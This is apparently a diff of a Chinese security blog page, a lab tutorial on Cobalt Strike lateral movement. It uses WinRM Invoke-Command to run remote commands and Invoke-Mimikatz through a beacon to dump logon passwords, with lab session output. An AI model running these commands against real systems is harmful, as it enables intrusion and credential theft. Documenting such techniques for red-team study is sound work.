+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\administrator
+\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\Classic <span class="token punctuation">.</span>NET AppPool
+\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\Daniel
+\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\Public
+\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\administrator\Contacts
+\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\administrator\Desktop
+\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\administrator\Documents
+\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\administrator\Downloads
+\\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users\administrator\Favorites
+……内容过多，余下部分省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h2 id="4、使用-WinRM-运行命令"><a href="#4、使用-WinRM-运行命令" class="headerlink" title="4、使用 WinRM 运行命令"></a>4、使用 WinRM 运行命令</h2><p>WinRM 运行在 5985 端口上，WinRM 是 Windows 远程管服务，使用 WinRM 可以使远程管理更容易一些。</p>
 <p>如果想利用 WinRM 运行命令则可以使用下面的命令。</p>
-<pre><code class="powershell">powershell Invoke-Command -ComputerName TARGET -ScriptBlock &#123;command here&#125;</code></pre>
-<pre><code class="powershell">beacon&gt; powershell Invoke-Command -ComputerName WIN-P2AASSD1AF1 -ScriptBlock &#123; net localgroup administrators&#125;
-[*] Tasked beacon to run: Invoke-Command -ComputerName WIN-P2AASSD1AF1 -ScriptBlock &#123; net localgroup administrators&#125;
-[+] host called home, sent: 303 bytes
-[+] received output:
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token function">Invoke-Command</span> <span class="token operator">-</span>ComputerName TARGET <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>command here<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell <span class="token function">Invoke-Command</span> <span class="token operator">-</span>ComputerName WIN<span class="token operator">-</span>P2AASSD1AF1 <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span> net localgroup administrators<span class="token punctuation">&#125;</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Invoke-Command</span> <span class="token operator">-</span>ComputerName WIN<span class="token operator">-</span>P2AASSD1AF1 <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span> net localgroup administrators<span class="token punctuation">&#125;</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 303 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
 别名     administrators
-注释     管理员对计算机/域有不受限制的完全访问权
+注释     管理员对计算机<span class="token operator">/</span>域有不受限制的完全访问权
 成员
--------------------------------------------------------------------------------
+<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>
 Administrator
 Domain Admins
 Daniel
 Enterprise Admins
-命令成功完成。</code></pre>
+命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>注：如果命令运行失败可能是因为 WinRM 配置原因，可在 powershell 环境下运行 <code>winrm quickconfig</code>命令，输入 <code>y</code> 回车即可。</p>
 <p>命令运行后的结果，WinRM 也将通过命令行进行显示，因此可以使用 Powershell 的 Invoke 命令来作为远程工具，而不使用其他的恶意软件来控制系统。</p>
 <h2 id="5、通过-WinRM-运行-Mimikatz"><a href="#5、通过-WinRM-运行-Mimikatz" class="headerlink" title="5、通过 WinRM 运行 Mimikatz"></a>5、通过 WinRM 运行 Mimikatz</h2><p>更进一步，甚至可以使用 PowerSploit 来通过 WinRM 运行 Mimikatz，只需要先导入 Invoke-Mimikatz.ps1 文件，再执行以下命令即可。</p>
-<pre><code class="powershell">powershell-import /path/to/Invoke-Mimikatz.ps1
-powershell Invoke-Mimikatz -ComputerName TARGET</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell<span class="token operator">-</span>import <span class="token operator">/</span>path<span class="token operator">/</span>to<span class="token operator">/</span><span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1
+powershell <span class="token function">Invoke-Mimikatz</span> <span class="token operator">-</span>ComputerName TARGET<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <blockquote>
 <p>注：之前提了很多次的 PowerView 也是 PowerSploit 项目里众多 ps1 文件之一，Mimikatz 的 ps1 文件在 PowerSploit 项目的 Exfiltration 目录下，PowerSploit 项目下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/">https://github.com/PowerShellMafia/PowerSploit/</a></p>
 </blockquote>
 <p>因为 beacon 上传文件大小限制在1MB，而 Invoke-Mimikatz.ps1 文件大小在 2 MB 多，因此直接运行 <code>powershell-import</code> 导入该文件会报错，这里可以选择使用 beacon 中的 upload 命令或者在当前会话的 File Browser 图形界面中上传该文件。</p>
-<pre><code class="powershell">upload C:\path\Invoke-Mimikatz.ps1</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">upload C:\path\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>上传之后通过 dir 命令可以查看到文件被上传到了C盘下，之后可以运行以下命令来导入该文件。</p>
-<pre><code class="powershell">powershell import-module C:\Invoke-Mimikatz.ps1</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token function">import-module</span> C:\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>最后再运行以下命令就能通过 WinRM 执行 Mimikatz 了。</p>
-<pre><code class="powershell">powershell Invoke-Mimikatz -ComputerName TARGET</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token function">Invoke-Mimikatz</span> <span class="token operator">-</span>ComputerName TARGET<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>如果提示<code>无法将“Invoke-Mimikatz”项识别为 cmdlet、函数……</code>，则可以将两条命令以分号合并在一起运行，即：</p>
-<pre><code>powershell import-module C:\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -ComputerName TARGET</code></pre>
-<pre><code class="powershell">beacon&gt; powershell import-module C:\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -ComputerName WIN-P2AASSD1AF1
-[*] Tasked beacon to run: import-module C:\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -ComputerName WIN-P2AASSD1AF1
-[+] host called home, sent: 287 bytes
-[+] received output:
+<pre class="line-numbers language-none"><code class="language-none">powershell import-module C:\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -ComputerName TARGET<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-  .#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
- .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot;
- ## / \ ##  /* * *
- ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- &#39;## v ##&#39;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
-  &#39;#####&#39;                                     with 20 modules * * */
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell <span class="token function">import-module</span> C:\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1 <span class="token punctuation">;</span> <span class="token function">Invoke-Mimikatz</span> <span class="token operator">-</span>ComputerName WIN<span class="token operator">-</span>P2AASSD1AF1
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">import-module</span> C:\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1 <span class="token punctuation">;</span> <span class="token function">Invoke-Mimikatz</span> <span class="token operator">-</span>ComputerName WIN<span class="token operator">-</span>P2AASSD1AF1
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 287 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
 
-mimikatz(powershell) # sekurlsa::logonpasswords
+  <span class="token punctuation">.</span><span class="token comment">#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14</span>
+ <span class="token punctuation">.</span><span class="token comment">## ^ ##.  "A La Vie, A L'Amour"</span>
+ <span class="token comment">## / \ ##  /* * *</span>
+ <span class="token comment">## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+ <span class="token string">'## v ##'</span>   http:<span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>gentilkiwi<span class="token punctuation">.</span>com<span class="token operator">/</span>mimikatz             <span class="token punctuation">(</span>oe<span class="token punctuation">.</span>eo<span class="token punctuation">)</span>
+  <span class="token string">'#####'</span>                                     with 20 modules <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token operator">/</span>
 
-Authentication Id : 0 ; 314628 (00000000:0004cd04)
-Session           : Interactive from 1
+mimikatz<span class="token punctuation">(</span>powershell<span class="token punctuation">)</span> <span class="token comment"># sekurlsa::logonpasswords</span>
+
+Authentication Id : 0 <span class="token punctuation">;</span> 314628 <span class="token punctuation">(</span>00000000:0004cd04<span class="token punctuation">)</span>
+Session           : Interactive <span class="token keyword">from</span> 1
 User Name         : administrator
 Domain            : TEAMSSIX
-Logon Server      : WIN-P2AASSD1AF1
-Logon Time        : 2020/8/20 23:53:08
-SID               : S-1-5-22-3301978333-983314215-684642015-500
-    msv :    
-     [00000003] Primary
-     * Username : Administrator
-……内容过多，余下部分省略……</code></pre>
+Logon Server      : WIN<span class="token operator">-</span>P2AASSD1AF1
+Logon Time        : 2020<span class="token operator">/</span>8<span class="token operator">/</span>20 23:53:08
+SID               : S<span class="token operator">-</span>1<span class="token operator">-</span>5<span class="token operator">-</span>22<span class="token operator">-</span>3301978333<span class="token operator">-</span>983314215<span class="token operator">-</span>684642015<span class="token operator">-</span>500
+	msv :	
+	 <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary
+	 <span class="token operator">*</span> Username : Administrator
+……内容过多，余下部分省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs16-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>终于把碰到的坑都填完了，睡觉……</p>
 <blockquote>
@@ -1137,7 +1174,7 @@ SID               : S-1-5-22-3301978333-983314215-684642015-500
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
